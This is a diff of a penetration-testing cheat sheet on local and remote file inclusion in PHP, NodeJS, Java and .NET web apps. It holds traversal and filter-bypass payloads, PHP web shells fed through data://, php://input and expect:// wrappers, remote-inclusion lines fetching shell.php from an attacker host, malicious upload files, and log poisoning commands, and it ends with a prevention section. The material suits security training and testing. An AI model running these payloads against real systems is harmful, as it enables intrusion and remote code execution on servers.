@@ -1,10 +1,16 @@
-# File Inclusions
-
-Back-end languages (PHP, JS, Java, .NET) use HTTP parameters to pick what gets rendered — template engines pulling dynamic content via `?language=es` or `?page=about`. Control the path being loaded and you get Local File Inclusion: source code disclosure, credential/key leaks, and under the right conditions RCE. LFI is most often found in templating engines.
+# File Inclusion
 
 ## Intro to File Inclusions
 
-Vulnerable pattern per language — user-controlled parameter straight into a file-loading function:
+Unsanitized file-path parameters let attackers include arbitrary local files: source code disclosure, sensitive data exposure, and under certain conditions RCE.
+
+### Local File Inclusion (LFI)
+
+Found most often in templating engines: static header/footer loads normally, dynamic content loads from a file named by a parameter (`/index.php?page=about` pulls `about.php`).
+
+### Examples of Vulnerable Code
+
+#### PHP
 
 ```php
 if (isset($_GET['language'])) {
@@ -12,212 +18,377 @@ if (isset($_GET['language'])) {
 }
 ```
 
-PHP: `include()`, `include_once()`, `require()`, `require_once()`, `file_get_contents()`. NodeJS: `fs.readFile(path.join(__dirname, req.query.language)...)`, Express `res.render('/' + req.params.language + '/about.html')` (URL-path parameter, e.g. /about/en). Java: `<jsp:include file="<%= request.getParameter('language') %>" />` and `<c:import url=...>`. .NET: `Response.WriteFile()`, `@Html.Partial()`, `<!--#include file=...-->`.
+#### NodeJS
 
-**Read vs Execute vs Remote URL** — decides which attacks apply:
+```javascript
+if(req.query.language) {
+    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
+        res.write(data);
+    });
+}
+```
 
-- PHP: include/include_once (read+execute+remote), require/require_once (read+execute, local only), file_get_contents (read+remote), fopen/file (read, local)
-- NodeJS: res.render() executes; fs.readFile()/sendFile() only read
-- Java: import (execute+remote); include (read only)
-- .NET: include (execute+remote); @Html.Partial/@Html.RemotePartial/Response.WriteFile (read only)
+```javascript
+app.get("/about/:language", function(req, res) {
+    res.render(`/${req.params.language}/about.html`);
+});
+```
 
-Execute-capable functions → potential RCE; read-only → source code only. Any RFI is also an LFI; the reverse needs the function to allow remote URLs.
+#### Java
+
+```text
+<c:if test="${not empty param.language}">
+    <jsp:include file="<%= request.getParameter('language') %>" />
+</c:if>
+```
+
+```text
+<c:import url= "<%= request.getParameter('language') %>"/>
+```
+
+#### .NET
+
+```text
+@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
+    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
+}
+```
+
+```text
+@Html.Partial(HttpContext.Request.Query['language'])
+```
+
+```text
+<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
+```
+
+### Read vs Execute
+
+Some inclusion functions only read file content, others also execute it. Execute-capable functions can lead to RCE; read-only ones still leak source/credentials.
+
+PHP: `include()`/`include_once()` read, execute, remote | `require()`/`require_once()` read, execute | `file_get_contents()` read, remote | `fopen()`/`file()` read
+
+NodeJS: `fs.readFile()` read | `fs.sendFile()` read | `res.render()` read, execute
+
+Java: `include` read | `import` read, execute, remote
+
+.NET: `@Html.Partial()` read | `@Html.RemotePartial()` read, remote | `Response.WriteFile()` read | `include` read, execute, remote
 
 ## Local File Inclusion (LFI)
 
-Basic test — swap the parameter for a universal readable file:
+Exploiting LFI to read local files via path manipulation, traversal, and bypassing prefixes or appended extensions.
 
-```text
-?language=/etc/passwd          (Linux)
-?language=C:\Windows\boot.ini  (Windows)
+### Basic LFI
+
+Common readable targets to confirm LFI: `/etc/passwd` Linux | `C:\Windows\boot.ini` Windows
+
+```http
+http://<TARGET_IP>:<PORT>/index.php?language=/etc/passwd
 ```
 
-**Path traversal** — when the app prefixes a directory (`include("./languages/" . $_GET['language'])`), escape with `../` to the root:
+### Path Traversal
 
-```text
-?language=../../../../etc/passwd
+```php
+include("./languages/" . $_GET['language']);
 ```
 
-Works whether or not the whole input is used, so default to it. `../` past root stays at root — overshooting is harmless, but find the minimum count for reports/exploits (/var/www/html = 3 levels).
+A prefixed directory breaks absolute-path payloads. Bypass by traversing with `../` repeatedly up to root.
 
-**Filename prefix** (`include("lang_" . $_GET['language'])`) — prepend `/` to make the prefix a directory:
-
-```text
-?language=/../../../etc/passwd
+```http
+http://<TARGET_IP>:<PORT>/index.php?language=../../../../etc/passwd
 ```
 
-Not guaranteed (lang_/ may not exist as a directory), and any prefix can break wrapper/RFI techniques.
+Extra `../` past root is harmless, so when unsure of depth add many. For efficiency, calculate the exact depth from the doc root instead.
 
-**Appended extension** (`include($_GET['language'] . ".php")`) — `/etc/passwd` becomes `/etc/passwd.php`. Bypasses in the next sections; otherwise you're restricted to that extension (still useful for source disclosure).
+### Filename Prefix
 
-**Second-order attacks** — poison a stored value (e.g. register the username `../../../etc/passwd`), then let another function pull a file based on that value (avatar download at `/profile/$username/avatar.png`). Devs protect direct input but trust DB values.
+```php
+include("lang_" . $_GET['language']);
+```
+
+Bypass by prefixing the payload with `/` so the prefix string becomes a directory component.
+
+```http
+http://<TARGET_IP>:<PORT>/index.php?language=/../../../etc/passwd
+```
+
+Fails if the prefix directory does not actually exist. Can also break wrapper/RFI payloads that need the prefix untouched.
+
+### Appended Extensions
+
+```php
+include($_GET['language'] . ".php");
+```
+
+Restricts inclusion to `.php` files. Bypasses covered in Basic Bypasses.
+
+### Second-Order Attacks
+
+LFI payload stored indirectly (e.g. a username) and triggered later when another function pulls a file based on that stored value (e.g. `/profile/<USERNAME>/avatar.png`).
+
+Works with any LFI, regardless of language/framework. Look for functions that pull files based on an indirectly controlled, stored value (database-backed).
 
 ## Basic Bypasses
 
-**Non-recursive `../` filters** (`str_replace('../', '', ...)`) — the filter runs once, so nested payloads survive the strip:
+Techniques to bypass LFI filters: non-recursive traversal filters, character encoding, approved-path checks, and appended extensions.
 
-```text
-?language=....//....//....//....//etc/passwd
+### Non-Recursive Path Traversal Filters
+
+```php
+$language = str_replace('../', '', $_GET['language']);
 ```
 
-Also `..././`, `....\/`, `....////`.
+The filter runs once, not recursively, so nested traversal sequences still resolve after stripping.
 
-**Encoding** — filters blocking `.` and `/` fall to URL encoding (encode everything, including dots):
-
-```text
-?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+```http
+http://<TARGET_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd
 ```
 
-Double-encode for other filter types. Core PHP ≤5.3.4 was itself vulnerable to this; newer versions only fall to custom filters.
+Other recursive variants: `....//` | `..././` | `..../` | `....////`
 
-**Approved-path regexes** (`preg_match('/^\.\/languages\/.+$/', ...)`) — find the approved path from the app's own form requests (or fuzz), then start with it and traverse out:
+### Encoding
 
-```text
-?language=./languages/../../../../etc/passwd
+URL-encode traversal characters to bypass filters blocking literal `.`/`/`. Decodes back to the traversal string before reaching the vulnerable function.
+
+```http
+http://<TARGET_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
 ```
 
-Combine with encoding/recursive payloads when stacked filters exist.
+Encode every character, including dots, since some encoders skip dots as part of the URL scheme. Double-encode (encode the already-encoded string) to bypass extra filter layers. Core PHP filters on `<=5.3.4` were specifically vulnerable; custom filters on newer versions may still be bypassable.
 
-**Appended extension bypasses** — both obsolete on modern PHP, valid on old servers:
+### Approved Paths
 
-- *Path truncation* (PHP <5.3/5.4): strings cap at 4096 chars, trailing `/.` stripped, extra slashes ignored. Pad with `./` until the appended `.php` is truncated off:
+```php
+if(preg_match('/^\./languages/.+$/', $_GET['language'])) {
+    include($_GET['language']);
+} else {
+    echo 'Illegal path specified!';
+}
+```
+
+Bypass by prefixing the payload with the approved path, then traversing out with `../`.
+
+```http
+http://<TARGET_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
+```
+
+Combine with encoding or the recursive-filter bypass if the approved-path check is layered with another filter.
+
+### Appended Extension
+
+Modern PHP (>=5.3/5.4) blocks the bypasses below; inclusion stays restricted to the given extension. Both techniques only work on PHP before 5.3/5.4.
+
+#### Path Truncation
+
+Old PHP strings truncate at 4096 chars; trailing slashes, single dots (`/.`), and repeated slashes get stripped/collapsed. A long enough path truncates the appended extension. Payload must start with a non-existing directory for this to work.
 
 ```bash
 echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
 ```
 
-(must start with a non-existing directory)
+More `../` can be added safely (still resolves to root). Verify total length so only the extension truncates, not the target path.
 
-- *Null bytes* (PHP <5.5): `%00` terminates the string — `/etc/passwd%00` cuts the appended `.php`.
+#### Null Bytes
+
+Condition: PHP `<5.5`. Append `%00` to terminate the string before the appended extension.
+
+```text
+/etc/passwd%00
+```
 
 ## PHP Filters
 
-PHP wrappers access I/O streams and extend LFI into source-code reading and RCE. The filter wrapper takes `resource` (the stream to filter) and `read` (the filter to apply); the useful filter is `convert.base64-encode` (Conversion Filters family).
+PHP stream wrappers (`php://`) let LFI reach beyond reading files: apply filters, read source as base64, or extend to RCE.
 
-Fuzz for PHP files first:
+### Input Filters
+
+`php://filter/` applies a filter to a resource: `resource` picks the stream (file), `read` picks the filter. Useful filter: `convert.base64-encode` (Conversion Filters).
+
+### Fuzzing for PHP Files
 
 ```bash
-ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
+ffuf -w directory-list-2.3-small.txt:FUZZ -u http://<TARGET_IP>:<PORT>/FUZZ.php
 ```
 
-Don't filter to 200 — with LFI you can read 301/302/403 pages' source too. Read sources → harvest referenced includes → read those, until the app's structure is mapped.
+Scan for all status codes, not just 200. LFI reads files regardless of normal HTTP access control, so `301`/`302`/`403` pages are still readable.
 
-Including a PHP file executes it (config renders as empty). To read the source instead:
+### Standard PHP Inclusion
 
-```text
-?language=php://filter/read=convert.base64-encode/resource=config
+Included `.php` files execute and render as HTML. Files with no HTML output (e.g. config files) return empty — a signal to switch to the base64 filter for source disclosure.
+
+### Source Code Disclosure
+
+```http
+http://<TARGET_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=<FILE>
 ```
 
-The returned base64 string decodes to the source (`echo '...' | base64 -d`). Resource goes at the end when `.php` gets appended. Hunt the result for credentials/DB keys and more file references. (Same principle for other languages — only needed where the function executes files.)
+Leave off the target's own extension, it gets appended automatically by the vulnerable code.
+
+```bash
+echo '<BASE64_STRING>' | base64 -d
+```
+
+Copy the full base64 string (check page source) or decoding fails.
 
 ## PHP Wrappers
 
-Quick-win RCE paths before wrappers: leak creds from config files, check `~/.ssh/id_rsa` per user, SSH in. Otherwise:
+Wrappers extend LFI past reading files to RCE: `data`, `input`, and `expect` wrappers execute attacker-supplied code directly.
 
-**Check `allow_url_include` first** — required for data://, input://, and all RFI. Read the config through LFI (grep for expect too while there):
+### Data
+
+Includes external data, including PHP code. Requires `allow_url_include = On`.
+
+#### Checking PHP Configurations
+
+Paths: `/etc/php/X.Y/apache2/php.ini` Apache | `/etc/php/X.Y/fpm/php.ini` Nginx
 
 ```bash
-curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
-# path: /etc/php/X.Y/apache2/php.ini (Apache) or /etc/php/X.Y/fpm/php.ini (Nginx); try version numbers downward
-echo 'W1BIUF0...' | base64 -d | grep allow_url_include
+curl "http://<TARGET_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/<PHP_VERSION>/apache2/php.ini"
 ```
 
-Not default-on, but some WordPress plugins/themes need it.
+```bash
+echo '<BASE64_STRING>' | base64 -d | grep allow_url_include
+```
 
-**data://** — include PHP code inline, base64 to dodge restrictions:
+#### Remote Code Execution
 
 ```bash
 echo '<?php system($_GET["cmd"]); ?>' | base64
 ```
 
-```text
-?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
+```http
+http://<TARGET_IP>:<PORT>/index.php?language=data://text/plain;base64,<BASE64_PAYLOAD>&cmd=<COMMAND>
 ```
 
-**php://input** — same, but the payload rides as POST body (param must accept POST):
+### Input
+
+Same idea as `data`, but the payload is sent as POST body. The vulnerable parameter must accept POST, and `allow_url_include` must be on.
 
 ```bash
-curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
+curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<TARGET_IP>:<PORT>/index.php?language=php://input&cmd=<COMMAND>"
 ```
 
-GET command passing needs `$_REQUEST`; POST-only functions → hardcode the command in the payload.
+Passing `cmd` as GET needs the function to accept `$_REQUEST`/GET too. Otherwise hardcode the command in the POSTed PHP instead of a dynamic web shell.
 
-**expect://** — direct command execution, no web shell; external extension, must be installed (`extension=expect` in php.ini — grep the decoded config). Config directive ≠ loaded, so test it live:
+### Expect
+
+Runs commands directly through the URL stream, no web shell needed. External wrapper, must be manually installed/enabled. `extension=expect` in php.ini only confirms it's configured, not that it loads.
 
 ```bash
-curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid
+curl -s "http://<TARGET_IP>:<PORT>/index.php?language=expect://<COMMAND>"
 ```
 
 ## Remote File Inclusion (RFI)
 
-Include remote URLs → SSRF into local-only ports/apps, or RCE by hosting a script yourself. RFI-capable functions: PHP include/include_once and file_get_contents (read-only), Java import, .NET include and @Html.RemotePartial (read-only). LFI ≠ RFI when: the function disallows remote URLs, you only control part of the filename (can't reach the `http://` wrapper position), or config blocks it.
+LFI-vulnerable functions that also accept remote URLs: enables SSRF and RCE by including an attacker-hosted script.
 
-**Verify** by including a local URL first (`http://127.0.0.1:80/index.php` — avoid including the vulnerable page itself: recursive-inclusion DoS). If the page renders, RFI + execution both work. Port control = SSRF to other local apps.
+### Local vs. Remote File Inclusion
 
-**RCE** — host `<?php system($_GET["cmd"]); ?>` as shell.php and include it. Prefer ports 80/443 (likely egress-whitelisted):
+An LFI is not always an RFI:
+
+- vulnerable function may not allow remote URLs
+- only part of the filename is controlled, not the protocol wrapper (`http://`, `ftp://`, etc.)
+- server config may disable RFI (off by default on most modern servers)
+
+### Verify RFI
+
+Checking `allow_url_include` alone is unreliable. Confirm by including a local URL first to avoid false negatives from firewalling.
+
+```http
+http://<TARGET_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
+```
+
+Don't include the vulnerable page itself, causes a recursive inclusion loop / DoS.
+
+### Remote Code Execution with RFI
+
+```bash
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+```
+
+Host on a common port (80/443), more likely whitelisted by outbound firewalls.
+
+#### HTTP
 
 ```bash
 sudo python3 -m http.server <LISTENING_PORT>
 ```
 
-```text
-?language=http://<ATTACKER_IP>:<LISTENING_PORT>/shell.php&cmd=id
+```http
+http://<TARGET_IP>:<PORT>/index.php?language=http://<ATTACKER_IP>:<LISTENING_PORT>/shell.php&cmd=<COMMAND>
 ```
 
-Watch your own server logs — if `.php` gets appended to the request, drop the extension from your payload.
+Check the connection log for an unexpected appended extension and drop it from the payload if seen.
 
-**FTP** — when HTTP ports/WAF-blocked strings are the problem:
+#### FTP
 
 ```bash
 sudo python -m pyftpdlib -p 21
 ```
 
-```text
-?language=ftp://<ATTACKER_IP>/shell.php&cmd=id
-?language=ftp://user:pass@<ATTACKER_IP>/shell.php&cmd=id    (auth required)
+```http
+http://<TARGET_IP>:<PORT>/index.php?language=ftp://<ATTACKER_IP>/shell.php&cmd=<COMMAND>
 ```
 
-**SMB (Windows targets)** — no `allow_url_include` needed; Windows treats remote SMB files as normal files via UNC paths:
+```http
+http://<TARGET_IP>:<PORT>/index.php?language=ftp://<USERNAME>:<PASSWORD>@<ATTACKER_IP>/shell.php&cmd=<COMMAND>
+```
+
+Default is anonymous auth. Useful if HTTP ports or the `http://` string are blocked.
+
+#### SMB
+
+Works on Windows targets without `allow_url_include`, since Windows treats SMB UNC paths as local files.
 
 ```bash
 impacket-smbserver -smb2support share $(pwd)
 ```
 
-```text
-?language=\\<ATTACKER_IP>\share\shell.php&cmd=whoami
+```http
+http://<TARGET_IP>:<PORT>/index.php?language=\\<ATTACKER_IP>\share\shell.php&cmd=<COMMAND>
 ```
 
-Most reliable on the same network — remote SMB over the internet is usually disabled.
+Most reliable on the same network; SMB over the internet is often blocked.
 
 ## LFI and File Uploads
 
-The upload form doesn't need to be vulnerable — only present. Any execute-capable function runs PHP inside an uploaded file regardless of extension or type.
+File upload + LFI with execute privileges = RCE regardless of extension/type, since included code executes once pulled in.
 
-**Malicious image** (magic bytes + shell, harmless alone, RCE when included):
+### Image upload
+
+#### Crafting Malicious Image
 
 ```bash
 echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
 ```
 
-GIF chosen for ASCII-typable magic bytes; works with any allowed type. Upload, grab the path from the rendered `<img src="/profile_images/shell.gif">` (or fuzz for the uploads dir), include:
+`GIF8` magic bytes used since they're plain ASCII. Works with any allowed image/file type whose magic bytes pass the upload check.
 
-```text
-?language=./profile_images/shell.gif&cmd=id
+#### Uploaded File Path
+
+Find the uploaded path from the page source (e.g. `<img src="...">`) or fuzz an uploads directory if hidden.
+
+```http
+http://<TARGET_IP>:<PORT>/index.php?language=<UPLOAD_PATH>/shell.gif&cmd=<COMMAND>
 ```
 
-`../` out first if the LFI prefixes a directory.
+If the LFI prefixes a directory, traverse out with `../` first before using the uploaded file's URL path.
 
-**zip:// wrapper** (not enabled by default) — zip a PHP shell into an image-named archive, reference the inner file with URL-encoded `#`:
+### Zip Upload
+
+Fallback if the direct method fails. `zip://` wrapper isn't enabled by default.
 
 ```bash
 echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
 ```
 
-```text
-?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
+```http
+http://<TARGET_IP>:<PORT>/index.php?language=zip://<UPLOAD_PATH>/shell.jpg%23shell.php&cmd=<COMMAND>
 ```
 
-**phar:// wrapper** — build with a stub and a shell sub-file:
+Some upload forms detect the zip by content-type despite the `.jpg` name.
+
+### Phar Upload
 
 ```php
 <?php
@@ -225,6 +396,7 @@ $phar = new Phar('shell.phar');
 $phar->startBuffering();
 $phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
 $phar->setStub('<?php __HALT_COMPILER(); ?>');
+
 $phar->stopBuffering();
 ```
 
@@ -232,82 +404,127 @@ $phar->stopBuffering();
 php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
 ```
 
-```text
-?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
+```http
+http://<TARGET_IP>:<PORT>/index.php?language=phar://<UPLOAD_PATH>/shell.jpg%2Fshell.txt&cmd=<COMMAND>
 ```
 
-Both are fallbacks — the plain image upload is the reliable one. (Obsolete footnote: LFI + uploads enabled + old PHP + exposed phpinfo() enables a classic temp-file attack — rare prerequisites.)
+Direct image-shell inclusion (above) is the most reliable; zip/phar are alternates if it fails.
 
 ## Log Poisoning
 
-Write PHP into any field that lands in a readable log file, then include that file through LFI. Needs read privileges on the log (varies by server).
+Write PHP code into a field that gets logged, then include that log through LFI to execute it. Requires read access to the log.
 
-**PHP Session Poisoning** — session files live at `/var/lib/php/sessions/sess_<PHPSESSID>` (Linux) / `C:\Windows\Temp\` (Windows). Read yours through LFI, find a controllable value (module case: the `page` value tracks the `?language=` param). Confirm control, poison with a URL-encoded web shell, then include the session file:
+### PHP Session Poisoning
 
-```text
-?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E     # poison
-?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id # execute
+Paths: `/var/lib/php/sessions/sess_<SESSION_ID>` Linux | `C:\Windows\Temp\` Windows
+
+Session filename is `sess_` plus the `PHPSESSID` cookie value. Check the session file for a field you control (e.g. one set by a GET/POST parameter), then poison it with a URL-encoded web shell:
+
+```http
+http://<TARGET_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
 ```
 
-Each inclusion overwrites the poisoned value — re-poison per command, or use the one shot to write a permanent shell / fire a reverse shell.
+```http
+http://<TARGET_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_<SESSION_ID>&cmd=<COMMAND>
+```
 
-**Server Log Poisoning** — Apache/Nginx log the User-Agent; poison it via Burp (intercept + edit UA) or cURL:
+The session file gets overwritten after inclusion (controlled field resets), so re-poison before every command, or drop a persistent/reverse shell on the first hit.
+
+### Server Log Poisoning
+
+Paths: Apache `/var/log/apache2/` Linux, `C:\xampp\apache\logs\` Windows | Nginx `/var/log/nginx/` Linux, `C:\nginx\log\` Windows
+
+Nginx logs are usually readable by low-privileged users by default; Apache logs usually need root/adm, except on older or misconfigured servers.
+
+```http
+http://<TARGET_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
+```
+
+Poison via `User-Agent`:
 
 ```bash
-echo -n "User-Agent: <?php system(\$_GET['cmd']);?>" > Poison
-curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
+echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
+curl -s "http://<TARGET_IP>:<PORT>/index.php" -H @Poison
 ```
 
-Then:
-
-```text
-?language=/var/log/apache2/access.log&cmd=id
+```http
+http://<TARGET_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=<COMMAND>
 ```
 
-Log locations: Apache `/var/log/apache2/` (Linux) / `C:\xampp\apache\logs\` (Windows); Nginx `/var/log/nginx/` / `C:\nginx\log\`. Nginx logs are readable by low-priv users (www-data) by default; Apache logs need root/adm unless old or misconfigured. Logs are huge — loading them can be slow or crash the server; don't send junk requests.
+Logs can be huge, inclusion may be slow or crash the server, send requests sparingly. `User-Agent` also appears in `/proc/self/environ` or `/proc/self/fd/<N>` (N usually 0-50), an alternate target if log read access is missing (often still needs privilege).
 
-Same trick via `/proc`: the UA also appears in `/proc/self/environ` and `/proc/self/fd/N` (N usually 0-50) — usually privileged-only, but a fallback when logs are unreadable. Any readable service log that records a controllable field works the same way — `/var/log/sshd.log`, `/var/log/mail`, `/var/log/vsftpd.log` (poison SSH/FTP usernames, mail body with PHP code). Generalize: controllable field + readable log = poisoning target.
+Other pollutable logs: `/var/log/sshd.log`, `/var/log/mail`, `/var/log/vsftpd.log` — poison via a field the service logs (e.g. SSH/FTP username, email) if the service is exposed and its log is readable.
 
 ## Automated Scanning
 
-Automate the trivial cases; keep manual skills for custom payloads and WAF workarounds.
+Fuzzing and LFI tools can quickly find trivial LFI vulnerabilities and bypasses, saving time over fully manual testing.
 
-**Fuzz parameters** — non-form params are less tested:
-
-```bash
-ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
-```
-
-(-fs = filter the default response size.) Applies to any web vuln class, not just LFI.
-
-**LFI payload wordlists:**
+### Fuzzing Parameters
 
 ```bash
-ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
+ffuf -w burp-parameter-names.txt:FUZZ -u 'http://<TARGET_IP>:<PORT>/index.php?FUZZ=value' -fs <SIZE>
 ```
 
-LFI-Jhaddix covers bypasses and common files in one pass — manually verify hits.
+Unlinked/undocumented parameters tend to be less secured than ones tied to visible forms.
 
-**Server webroot** (needed when relative paths can't reach uploads etc.) — fuzz common webroot paths with traversal prepended:
+### LFI wordlists
+
+Wordlist: `LFI-Jhaddix.txt` — contains various bypasses and common files.
 
 ```bash
-ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
+ffuf -w LFI-Jhaddix.txt:FUZZ -u 'http://<TARGET_IP>:<PORT>/index.php?language=FUZZ' -fs <SIZE>
 ```
 
-**Server logs/configs** — dedicated lists (LFI-WordList-Linux, non-seclists, download first) find far more than Jhaddix:
+Manually verify any hits. A quick test, not a replacement for manual testing.
+
+### Fuzzing Server Files
+
+#### Server Webroot
 
 ```bash
-ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
+ffuf -w default-web-root-directory-linux.txt:FUZZ -u 'http://<TARGET_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs <SIZE>
 ```
 
-Then chase findings manually: `apache2.conf` yields `DocumentRoot /var/www/html` and `${APACHE_LOG_DIR}/access.log`; the variable resolves in `/etc/apache2/envvars` (`export APACHE_LOG_DIR=/var/log/apache2`). This file-to-file pivoting mirrors the PHP-filters source-reading loop.
+Useful when the uploads directory can't be reached relatively. Resolves the absolute webroot path for absolute-path payloads.
 
-**LFI tools** — LFISuite, LFiFreak, liffy. Mostly unmaintained python2; may save time, will miss things.
+#### Server Logs/Configurations
+
+Wordlist: `./LFI-WordList-Linux` (download separately, not part of seclists)
+
+```bash
+ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<TARGET_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs <SIZE>
+```
+
+```bash
+curl http://<TARGET_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
+```
+
+Log path may use an env var (e.g. `APACHE_LOG_DIR`) resolved in a separate file:
+
+```bash
+curl http://<TARGET_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
+```
+
+### LFI Tools
+
+Tools: `LFISuite`, `LFiFreak`, `liffy`
+
+Most are unmaintained and rely on Python 2, reliability varies.
 
 ## File Inclusion Prevention
 
-- **Best fix:** never pass user input into inclusion functions/APIs — load assets server-side only. Otherwise whitelist: match user input (IDs, names) to files via a DB table, case-match script, or JSON map; the matched file (not the raw input) goes into the function, with a default for everything else.
-- **Directory traversal:** strip to the filename with built-ins — PHP `basename()` (native functions get edge cases fixed; hand-rolled ones don't — e.g. Bash wildcards `cat .?/.*/.?/etc/passwd` slip past naive filters when PHP shells out via `system()`). Or sanitize recursively:
+Patch LFI by never passing user input into inclusion functions, or restrict it to a whitelist mapping input to allowed files (DB table, case-match script, or static JSON map).
+
+### Preventing Directory Traversal
+
+Directory traversal can let attackers:
+
+- read `/etc/passwd`: SSH keys, valid usernames for a password spray
+- find other local services (e.g. Tomcat) and read `tomcat-users.xml`
+- discover valid PHP session cookies, session hijacking
+- read the web app's config and source code
+
+Use the framework's own filename-only function (e.g. PHP `basename()`); downside is it can't enter subdirectories. Custom traversal filters can miss edge cases — bash treats `?`/`*` as `.` for traversal, PHP does not, so piping into `system()` can reopen the bypass.
 
 ```php
 while(substr_count($input, '../', 0)) {
@@ -315,5 +532,14 @@ while(substr_count($input, '../', 0)) {
 };
 ```
 
-- **Server config:** `allow_url_fopen = Off` and `allow_url_include = Off`; lock the app to the webroot (`open_basedir = /var/www` in php.ini, or Docker); disable dangerous modules (PHP Expect, mod_userdir). LFI survives, but impact drops to the web folder.
-- **WAF (ModSecurity):** start in permissive mode (report-only) to tune rules without blocking legitimate traffic — even permanently permissive, it's an early-warning tripwire. Hardening buys detection time (M-Trends 2020: average breach detection was 30 days); keep testing hardened systems, especially after zero-days in related frameworks — unique logs from a hardened environment confirm whether an exploit actually landed.
+### Web Server Configuration
+
+`allow_url_fopen` Off | `allow_url_include` Off — disables remote file inclusion (PHP)
+
+Restrict the app to its webroot (Docker, or PHP `open_basedir = /var/www` in php.ini). Disable dangerous modules: PHP Expect, mod_userdir.
+
+### Web Application Firewall (WAF)
+
+E.g. ModSecurity. Permissive mode reports without blocking, letting defenders tune rules before enabling blocking mode; it's an early warning sign even unblocked.
+
+Hardening buys detection time, not invulnerability. Keep testing and watching logs, especially after a zero-day lands for a related framework.
